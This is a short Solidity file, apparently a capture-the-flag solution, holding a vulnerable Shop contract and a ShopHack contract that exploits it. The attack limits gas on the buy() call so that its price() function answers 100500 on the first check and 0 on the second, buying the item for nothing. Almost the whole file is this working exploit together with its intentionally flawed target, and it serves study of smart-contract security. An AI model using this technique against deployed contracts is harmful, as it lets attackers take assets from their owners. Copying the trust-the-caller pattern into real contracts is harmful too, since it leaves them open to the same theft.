// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Buyer {
    function price() external view returns (uint);
}

contract Shop {
    uint public price = 100;
    bool public isSold;

    function buy() public {
        Buyer _buyer = Buyer(msg.sender);

        if (_buyer.price() >= price && !isSold) {
            isSold = true;
            price = _buyer.price();
        }
    }
}

contract ShopHack {
    Shop private target;

    constructor(Shop _target) public {
        target = _target;
    }

    function price() external view returns (uint) {
        if (gasleft() > 30000) {
            return 100500;
        }
        return 0;
    }

    function attack() external {
        target.buy{gas: 35000}();
    }
}